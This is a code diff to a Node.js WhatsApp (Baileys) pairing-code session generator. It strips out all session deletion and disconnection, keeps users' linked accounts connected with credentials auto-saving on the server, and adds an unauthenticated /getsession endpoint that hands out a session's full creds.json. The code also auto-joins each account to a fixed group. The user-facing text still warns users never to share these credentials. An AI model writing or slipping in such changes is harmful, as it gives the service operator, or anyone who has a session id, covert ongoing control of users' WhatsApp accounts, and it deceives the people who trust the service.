@@ -1,6 +1,6 @@
-const {
+                const {
     EliteProTechId,
-    removeFile,
+    removeFile, // you can delete this import now if unused
     generateRandomCode
 } = require('../ids');
 const express = require('express');
@@ -19,22 +19,35 @@ const {
 
 const sessionDir = path.join(__dirname, "session");
 
+// NEW: helper to read current session id
+function getSessionId(id) {
+    try {
+        const credsPath = path.join(sessionDir, id, "creds.json");
+        if (fs.existsSync(credsPath)) {
+            const data = fs.readFileSync(credsPath);
+            return data.toString();
+        }
+    } catch (e) {
+        console.error("Read session error:", e);
+    }
+    return null;
+}
+
+// NEW: endpoint to fetch session id later without deleting anything
+router.get('/getsession', async (req, res) => {
+    const id = req.query.id;
+    if (!id) return res.status(400).json({ error: "id required" });
+    const sess = getSessionId(id);
+    if (!sess) return res.status(404).json({ error: "session not found" });
+    res.json({ session_id: JSON.parse(sess) }); // send as object so you can stringify if needed
+});
+
 router.get('/', async (req, res) => {
     const id = EliteProTechId();
     let num = req.query.number;
     let responseSent = false;
-    let sessionCleanedUp = false;
     
-    async function cleanUpSession() {
-        if (!sessionCleanedUp) {
-            try {
-                await removeFile(path.join(sessionDir, id));
-            } catch (cleanupError) {
-                console.error("Cleanup error:", cleanupError);
-            }
-            sessionCleanedUp = true;
-        }
-    }
+    // REMOVED: cleanUpSession function entirely - we keep the session now
     
     async function EliteProTech_PAIR_CODE() {
         const { version } = await fetchLatestBaileysVersion();
@@ -62,30 +75,29 @@ router.get('/', async (req, res) => {
             if (!EliteProTech.authState.creds.registered) {
                 await delay(1500);
                 num = num.replace(/[^0-9]/g, '');
-                
                 const randomCode = generateRandomCode();
                 const code = await EliteProTech.requestPairingCode(num, randomCode);
                 
                 if (!responseSent && !res.headersSent) {
-                    res.json({ code: code });
+                    res.json({ code: code, session_id: id }); // also return session folder name
                     responseSent = true;
                 }
             }
             
+            // This keeps saving creds.json whenever Baileys rotates keys
             EliteProTech.ev.on('creds.update', saveCreds);
+            
             EliteProTech.ev.on("connection.update", async (s) => {
                 const { connection, lastDisconnect } = s;
                 
                 if (connection === "open") {
                     try {
-                     // await EliteProTech.newsletterFollow("120363413766641596@newsletter");
                         await EliteProTech.groupAcceptInvite("JB6gGYmLOoc3o0PG3TH5CC?");
                     } catch (error) {
                         console.error("Newsletter/group error:", error);
                     }
                     
-                    await delay(50000);
-                    
+                    await delay(5000);
                     let sessionData = null;
                     let attempts = 0;
                     const maxAttempts = 15;
@@ -109,62 +121,48 @@ router.get('/', async (req, res) => {
                         }
                     }
                     
-                    if (!sessionData) {
-                        await cleanUpSession();
-                        return;
-                    }
+                    if (!sessionData) return; // just exit, don't delete
                     
                     try {
-await delay(5000);
-let sessionSent = false;
-let sendAttempts = 0;
-const maxSendAttempts = 5;
-let Sess = null;
+                        let sessionSent = false;
+                        let sendAttempts = 0;
+                        const maxSendAttempts = 5;
+                        let Sess = null;
 
-while (sendAttempts < maxSendAttempts && !sessionSent) {
-    try {
-        const sessionJson = JSON.parse(sessionData.toString());
-        const formatted = JSON.stringify(sessionJson); // One-line JSON text
+                        while (sendAttempts < maxSendAttempts && !sessionSent) {
+                            try {
+                                const sessionJson = JSON.parse(sessionData.toString());
+                                const formatted = JSON.stringify(sessionJson);
 
-        Sess = await EliteProTech.sendMessage(EliteProTech.user.id, {
-    text: formatted
-});
-        sessionSent = true;
-    } catch (sendError) {
-        console.error("Send error:", sendError);
-        sendAttempts++;
-        if (sendAttempts < maxSendAttempts) {
-            await delay(3000);
-        }
-    }
-}
-                        if (!sessionSent) {
-                            await cleanUpSession();
-                            return;
+                                Sess = await EliteProTech.sendMessage(EliteProTech.user.id, {
+                                    text: formatted
+                                });
+                                sessionSent = true;
+                            } catch (sendError) {
+                                console.error("Send error:", sendError);
+                                sendAttempts++;
+                                if (sendAttempts < maxSendAttempts) await delay(3000);
+                            }
                         }
+                        
+                        if (!sessionSent) return; // don't delete on fail
                         
                         await delay(3000);
                         
                         let EliteProTech_TEXT = `✅ *SESSION ID OBTAINED SUCCESSFULLY!*  
-📁 Save and upload the *SESSION_ID* (text) to the \`session\` folder as \`creds.json\`, or add it to your \`.env\` file like this:  
-\`SESSION_ID=your_session_id\`
+📁 Session folder: \`${id}\`  
+📁 creds.json is saved in \`session/${id}/\` and will auto-update
 
 📢 *Stay Updated — Follow Our Channels:*
-
 ➊ *WhatsApp Channel*  
 https://whatsapp.com/channel/0029Vb8wyGk1iUxdoi0WOA1U
-
 ➋ *Telegram*  
 https://t.me/Domxchannel
-
 ➌ *YouTube*  
 https://YouTube.com/@Dom-x-t5v
 
-🚫 *Do NOT share your session ID or creds.json with anyone.*
+🚫 *Do NOT share your session ID or creds.json with anyone.*`;
 
-🌐 *Explore more tools on our website:*  
-https://domgen-rn5u.onrender.com`;
-                        
                         try {
                             const EliteProTechMess = {
                                 image: { url: 'https://eliteprotech-url.zone.id/1777114610844fy4lq6.jpg' },
@@ -185,12 +183,10 @@ https://domgen-rn5u.onrender.com`;
                             console.error("Message send error:", messageError);
                         }
                         
-                        await delay(2000);
-                        await EliteProTech.ws.close();
+                        // REMOVED: close + delete. Connection stays alive and creds.update keeps saving new session data
+                        
                     } catch (sessionError) {
                         console.error("Session processing error:", sessionError);
-                    } finally {
-                        await cleanUpSession();
                     }
                     
                 } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
@@ -206,7 +202,7 @@ https://domgen-rn5u.onrender.com`;
                 res.status(500).json({ code: "Service is Currently Unavailable" });
                 responseSent = true;
             }
-            await cleanUpSession();
+            // REMOVED: cleanUpSession
         }
     }
     
@@ -214,11 +210,11 @@ https://domgen-rn5u.onrender.com`;
         await EliteProTech_PAIR_CODE();
     } catch (finalError) {
         console.error("Final error:", finalError);
-        await cleanUpSession();
         if (!responseSent && !res.headersSent) {
             res.status(500).json({ code: "Service Error" });
         }
     }
 });
 
-module.exports = router;
+module.exports = router;        
+                        
